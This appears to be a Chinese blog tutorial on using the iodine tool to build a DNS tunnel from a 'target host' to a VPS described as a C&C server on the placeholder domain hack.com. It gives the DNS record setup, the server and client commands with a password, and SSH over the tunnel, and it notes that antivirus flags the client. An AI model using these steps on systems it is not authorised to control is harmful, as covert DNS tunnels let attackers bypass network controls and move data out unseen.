**目录**

[iodine](#t0 "iodine")

[使用iodin搭建隧道](#t1 "使用iodin搭建隧道")

[（1）：部署域名解析](#t2 "（1）：部署域名解析")

[（2）：安装并启动服务端](#t3 "（2）：安装并启动服务端")

[（3）：安装并启动客户端](#t4 "（3）：安装并启动客户端")

[（4）：使用DNS隧道](#t5 "（4）：使用DNS隧道")

* * *

iodine
======

iodine是基于C语言开发的，分为服务端和客户端。iodine支持转发模式和中继模式。其原理是：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道连接，处于同一个局域网(可以通过ping命令通信)。在客户端和服务器之间建立连接后，客户机上会多出一块名为dns0的虚拟网卡。

与同类工具相比，iodine具有如下特点：

*   不会对下行数据进行编码
*   支持多平台(Linux、Windows、MacOS)
*   支持16个并发连接
*   支持强密码机制
*   支持同网段隧道IP地质(不同于服务器一客户端网段)
*   支持多种DNS记录类型
*   提供了丰富的隧道质量检测措施

使用iodin搭建隧道
===========

### **（1）：部署域名解析**

首先，用一台公网的Linux系统的VPS作为C&C服务器，并准备好一个可以配置的域名(这里我们假设是hack.com)。然后，去配置域名的记录。首先创建记录A，将自己的域名 www.hack.com 解析到VPS服务器地址。然后，创建NS记录，将 test.hack.com 指向 www.hack.com 。

*   第一条A类解析是在告诉域名系统，www.hack.com 的IP地址是 xx.xx.xx.xx 。
*   第二条NS解析是在告诉域名系统，想要知道 test.hack.com 的IP地址，就去问 www.hack.com 。

![](https://img-blog.csdnimg.cn/20200220235659545.png)

为什么要设置NS类型的记录呢？因为NS类型的记录不是用于设置某个域名的DNS服务器的，而是用于设置某个子域名的DNS服务器的。

**如何验证域名解析设置是否成功？**  
在随便一台电脑上ping域名 www.hack.com ，若能ping通，且显示的IP地址是我们配置的VPS的地址，说明第一条A类解析设置成功并已生效。

![](https://img-blog.csdnimg.cn/20200220235947885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后在我们的VPS上执行以下命令监听UDP53端口

```
tcpdump -n -i eth0 udp dst port 53
```


在任意一台机器上执行  nslookup test.hack.com 命令，如果在我们的VPS监听的端口有查询信息，说明第二条记录设置成功

![](https://img-blog.csdnimg.cn/20200221000107365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### （2）：安装并启动服务端

Kali中默认安装了iodine，但是我们这里用的服务端是Centos7系统，可以执行命令：yum -y install iodine 安装。如果是Windows系统，可以安装编译好的对应版本的iodine。

![](https://img-blog.csdnimg.cn/20200221164500801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

执行以下命令启动服务端

```
iodined -f -c -P root@123456 192.168.100.1 test.hack.com -DD      
    -f：在前台运行      
    -c：禁止检查所有传入请求的客户端IP地址      
    -P：指定密码      
    -D：指定调试级别。-DD指第二级，D的数量随等级增加      
    这里的192.168.10.1是自定义的局域网虚拟IP地址
```


![](https://img-blog.csdnimg.cn/20200221191518605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

启动完后，可以通过iodine检查页面：[kryo.se: iodine test page](https://code.kryo.se/iodine/check-it/ "kryo.se: iodine test page")  检查配置是否正确。如下，表示设置成功

![](https://img-blog.csdnimg.cn/20200221170009420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

服务端启动成功后，VPS上多了一块dns0的网卡，ip为我们设置的192.168.100.1

![](https://img-blog.csdnimg.cn/20200221191415963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### （3）：安装并启动客户端

**Windows系统**

如果是Windows系统，直接执行下面命令启动客户端，但是启动的过程中，会遇到杀毒软件的报毒，并且需要管理员权限执行命令才可以启动

```
iodine.exe -f -P root@123456 test.hack.com
```


![](https://img-blog.csdnimg.cn/20200221170331762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200221170521622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

那我们现在就以管理员权限运行该命令，如图，DNS隧道建立成功

![](https://img-blog.csdnimg.cn/20200221203156177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

查看客户端网卡，多了一张以太网2，IP为192.168.100.2。此时，我们的VPS和客户端处在同一个逻辑的局域网内。

![](https://img-blog.csdnimg.cn/20200221202939132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

但是此时ping服务端的192.168.100.1地址却ping不通，不知为何，客户端如果是Linux则不会有此情况。

![](https://img-blog.csdnimg.cn/2020022120442418.png)

**Linux系统**

如果是Linux系统，先安装iodine。上传iodlie客户端到目标主机，解压，进入目录安装

```
cd iodine-0.7.0/      
make && make install
```


![](https://img-blog.csdnimg.cn/20200221173920652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后执行下面命令连接服务端(需要root权限)，如图连接成功。

```
iodine -f -P root@123456 test.hack.com
```


![](https://img-blog.csdnimg.cn/20200221173206518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

连接成功后，客户端上新建了一个dns0的网卡，IP地址为192.168.100.2

![](https://img-blog.csdnimg.cn/20200221173542822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后ping服务端地址192.168.100.1，能互通！

![](https://img-blog.csdnimg.cn/2020022117343312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### （4）：使用DNS隧道

客户端和服务端连接成功后，由于客户端和服务端处在一个逻辑的局域网中，所以可以直接通。

**服务端SSH连接客户端**

![](https://img-blog.csdnimg.cn/20200221175450651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**客户端SSH连接服务端**

![](https://img-blog.csdnimg.cn/20200221173802660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

其他服务也是一样，可以直接指定虚拟局域网的IP和端口就可连接。

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)